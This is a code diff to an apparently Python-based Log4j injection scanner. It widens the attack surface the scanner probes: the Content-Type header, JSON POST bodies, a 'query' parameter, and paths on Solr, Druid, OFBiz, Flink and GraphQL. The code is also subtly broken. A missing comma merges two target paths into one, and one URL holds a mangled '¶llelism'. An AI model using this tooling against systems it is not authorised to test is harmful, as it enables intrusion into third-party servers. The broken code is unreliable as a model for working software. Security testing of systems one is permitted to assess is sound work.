@@ -193,9 +193,26 @@ class Log4gScanner:
                 sys.exit(0)
             return 0
 
+    def doJsonPost(self, url, headers, data):
+        # print(url, fuzz_key)
+        if not self.t1.is_alive() and len(self.vuln_res) > 0:
+            # self.logger(text="[!] Udp server stop...")
+            return 1
+        try:
+            self.response = requests.post(url, json=data, headers=headers, verify=False, timeout=time_out)
+            return self.response
+        except Exception as e:
+            if "timed out" in str(e):
+                self.logger(4, "[!!!] Request time out, Check your network...")
+                self.logger(2, "[-] Closed program...")
+                self.udp.close()
+                sys.exit(0)
+            return 0
+
     def fuzzHeader(self, url, payload):
         # self.logger(4, "[*] 正在Fuzz Header...")
         headers_fuzz_list = {
+            "Content-Type": payload,
             "Accept-Charset": payload,
             "Accept-Datetime": payload,
             "Accept-Encoding": payload,
@@ -301,10 +318,14 @@ class Log4gScanner:
             }
             headers[k] = v
             r = self.doGet(url, headers=headers)
-            del headers[k]
             if r == 1:
                 self.requestInfo(self.response)
                 return 1
+            jr = self.doJsonPost(url, headers=headers, data="")
+            if jr == 1:
+                self.requestInfo(self.response)
+                return 1
+            del headers[k]
         return 0
 
     def fuzzParam(self, url, payload):
@@ -321,6 +342,7 @@ class Log4gScanner:
             "payload": payload,
             "token": payload,
             "verify": payload,
+            "query": payload,
         }
         for k,v in param_fuzz_list.items():
             if self.show_fuzz_info == 1:
@@ -328,6 +350,10 @@ class Log4gScanner:
             data = {k: v}
             r = self.doPost(url, headers=headers, data=data)
             if r == 1:
+                self.requestInfo(self.response)
+                return 1
+            jr = self.doJsonPost(url, headers=headers, data=data)
+            if jr == 1:
                 self.requestInfo(self.response)
                 return 1
         return 0
@@ -338,9 +364,18 @@ class Log4gScanner:
             if "?" in path or "=" in path or path[-1] == "/":
                 if self.show_fuzz_info == 1:
                     self.logger(text="[*] Fuzzing Url：" + path)
-                fuzz_url = url + path + payload
+                if "/jars/" == path:
+                    # path = path.split("/")[1]
+                    fuzz_url = url + path + ".jar/run"
+                    self.payload = self.payload.replace("/", "%252f")
+                else:
+                    fuzz_url = url + path + payload
                 r = self.doGet(fuzz_url, headers=headers)
                 if r == 1:
+                    self.requestInfo(self.response)
+                    return 1
+                rp = self.doPost(fuzz_url, headers=headers, data="")
+                if rp == 1:
                     self.requestInfo(self.response)
                     return 1
         return 0
@@ -355,11 +390,21 @@ class Log4gScanner:
             "/?id=",
             "/?username=",
             "/?page=",
+            "/webtools/control/main",
             "/websso/SAML2/SLO/vsphere.local?SAMLRequest=",
             "/struts/utils.js",
             "/solr/admin/collections?wt=json&action=",
+            "/solr/admin/info/system?wt=json&_=",
+            "/solr/admin/cores?_=&action=&config=&dataDir=&name=&schema=&wt=&instanceDir="
+            "/druid/v2/",
+            "/druid/indexer/",
+            "/druid/coordinator/",
             "/druid/coordinator/v1/lookups/config/",
             "/wiki/",
+            "/webtools/control/setLocaleFromBrowser",
+            "/jars/",
+            "/jars/11.jar/plan?program-args=1&entry-class=1¶llelism=1",
+            "/graphql/",
         ]
         self.logger(text="[*] Fuzzing, Please wait...")
         fp = self.fuzzPath(path_fuzz_list, url, payload)
